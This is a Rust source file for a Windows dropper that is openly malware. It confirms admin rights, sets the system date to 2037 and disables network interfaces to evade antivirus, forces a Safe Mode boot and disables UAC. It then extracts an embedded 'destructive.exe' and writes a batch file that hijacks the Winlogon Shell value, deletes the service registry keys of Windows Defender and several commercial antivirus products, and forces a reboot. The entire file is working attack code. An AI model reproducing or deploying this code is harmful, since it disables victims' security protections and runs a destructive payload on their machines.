use std::process::{Command, Stdio};
use std::path::{Path};
use std::fs::{File};
use std::io::{self, Write};
use winreg::enums::*;
use winreg::RegKey;
use std::fs;

fn disable_uac() -> io::Result<()> {
    // Open the registry key for User Account Control
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let uac_key = hkcu.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
        KEY_SET_VALUE
    )?;

    // Set EnableLUA to 0 to disable UAC
    uac_key.set_value("EnableLUA", &0u32)?;

    println!("UAC has been disabled (EnableLUA set to 0).");

    Ok(())
}

fn enable_safe_mode() -> io::Result<()> {
    // Set the system to boot in Safe Mode
    Command::new("bcdedit.exe")
        .arg("/set")
        .arg("{current}")
        .arg("safeboot")
        .arg("minimal")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()?;

    Ok(())
}

fn disable_network_interfaces() -> Result<(), std::io::Error> {
    // Disable all interfaces
    let output = Command::new("netsh")
        .arg("interface")
        .arg("show")
        .arg("interface")
        .output()?;

    let interfaces = String::from_utf8_lossy(&output.stdout);

    // Loop through interfaces and disable them
    for line in interfaces.lines() {
        if line.contains("Enabled") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if let Some(interface_name) = parts.get(3) {
                println!("Disabling interface: {}", interface_name);
                let _ = Command::new("netsh")
                    .arg("interface")
                    .arg("set")
                    .arg("interface")
                    .arg(interface_name)
                    .arg("disable")
                    .output();
            }
        }
    }

    Ok(())
}

fn change_system_date() -> Result<(), String> {
    // Change system date to 01-19-2037 (Windows format mm-dd-yyyy)
    let date_command = "date 01-19-2037";

    // Run date command
    let date_output = Command::new("cmd")
        .arg("/C")
        .arg(date_command)
        .stderr(Stdio::inherit())  // Pass error output to console
        .output()
        .map_err(|e| e.to_string())?;

    if !date_output.status.success() {
        return Err(format!("Failed to change date: {}", String::from_utf8_lossy(&date_output.stderr)));
    }

    println!("System date changed to 01-19-2037.");
    Ok(())
}

fn is_admin() -> bool {
    let output = Command::new("whoami")
        .arg("/groups")
        .output();

    match output {
        Ok(output) => {
            let output_str = String::from_utf8_lossy(&output.stdout);
            output_str.contains("S-1-5-32-544")  // SID for Administrators group
        },
        Err(_) => false,  // If the command fails, assume not admin
    }
}

fn modify_registry() -> io::Result<()> {
    // Open the registry key for Winlogon
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let winlogon_key = hkcu.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        KEY_SET_VALUE,
    )?;

    // Delete existing "Shell" value (if it exists)
    match winlogon_key.delete_value("Shell") {
        Ok(_) => println!("Existing Shell value deleted."),
        Err(e) => eprintln!("Failed to delete Shell value: {}", e),
    }

    // Set new "Shell" value
    let new_shell_value = r"c:\program files\utkudrk2\utkudrk2.bat";
    winlogon_key.set_value("Shell", &new_shell_value)?;

    println!("Registry modified successfully: Shell set to \"C:\\Program Files\\utkudrk2\\utkudrk2.bat\".");

    Ok(())
}

fn create_batch_file() -> io::Result<()> {
    // Create a batch file to clean up Safe Mode and schedule desturctive.exe
    let batch_content = r#"
@echo off
:: Check if we are in Safe Mode by examining the current boot entry
bcdedit /enum {current} | findstr /i "safeboot"
if %errorlevel% == 0 (
    echo Safe Mode is enabled, proceeding with actions...
) else (
    echo Safe Mode is not enabled
    "c:\program files\utkudrk2\destructive.exe"
    exit
)

:: Wait for the reboot to happen and run this part only after Safe Mode is entered

:: Modify Shell registry to run batch file
echo Modifying registry to set Shell value...
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, c:\program files\utkudrk2\utkudrk2.bat" /f

:: Perform cleanup tasks
echo Removing Safe Mode setting...
bcdedit /deletevalue {current} safeboot

:: Delete registry keys related to antivirus services
echo Deleting registry keys...
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\AVP21.3" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\MBAMService" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f

:: Confirm completion
echo Cleanup tasks completed. Safe Mode should now be removed, desturctive.exe is scheduled to run, and Shell key is modified.

:: Reboot the system after completion
shutdown /r /f /t 5

:: Exit
exit
"#;

    let path = Path::new("c:\\Program Files\\utkudrk2\\utkudrk2.bat");
    let mut file = File::create(path)?;
    file.write_all(batch_content.as_bytes())?;

    Ok(())
}

fn extract_embedded_exe() -> io::Result<()> {
    // Ensure the target directory exists
    let target_dir = Path::new("C:\\Program Files\\utkudrk2");
    if !target_dir.exists() {
        fs::create_dir_all(target_dir)?;
        println!("Created directory: {}", target_dir.display());
    }

    // Write the embedded executable to a file
    let exe_path = target_dir.join("destructive.exe");
    let mut exe_file = File::create(&exe_path)?;
    exe_file.write_all(include_bytes!("../resources/destructive.exe"))?;
    println!("Executable saved to {}.", exe_path.display());

    Ok(())
}

fn reboot_system() -> io::Result<()> {
    // Shutdown and reboot the system to Safe Mode
    Command::new("shutdown.exe")
        .arg("-r")
        .arg("-t")
        .arg("7")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()?;

    Ok(())
}

fn main() {
    // Step 1: Admin Control Check
    if !is_admin() {
        eprintln!("You need administrator privileges to run this program.");
        return;
    }

    println!("Admin privileges confirmed.");

    //Define directory path
    let dir_path = Path::new(r"C:\Program Files\utkudrk2");

    // Ensure the directory exists
    if let Err(e) = fs::create_dir_all(dir_path) {
        eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
        std::process::exit(1); // Exit the program with a failure status
    }

    // Step 2: Kaspersky, Bitdefender bypass (General Antivirus bypass)
    if let Err(e) = change_system_date() {
        eprintln!("Error changing system date: {}", e);
    }

    if let Err(e) = disable_network_interfaces() {
        eprintln!("Error disabling network interfaces: {}", e);
    }

    // Step 3: Enable safe mode
    if let Err(e) = enable_safe_mode() {
        eprintln!("Error enabling safe mode: {}", e);
    }

    // Step 4: Disable UAC
    if let Err(e) = disable_uac() {
        eprintln!("Error disabling UAC: {}", e);
    }

    // Step 5: Extract payload
    if let Err(e) = extract_embedded_exe() {
        eprintln!("Error extracting embedded executable: {}", e);
    }
    
    // Step 6: Create the batch file in the current directory
    if let Err(e) = create_batch_file() {
        eprintln!("Error creating batch file: {}", e);
        return;
    }

    // Step 7: Reboot the system to Safe Mode if needed
    if let Err(e) = reboot_system() {
        eprintln!("Error rebooting system: {}", e);
    }

    // Step 9: Modify the registry to set Shell value
    if let Err(e) = modify_registry() {
        eprintln!("Error modifying the registry: {}", e);
    }

}
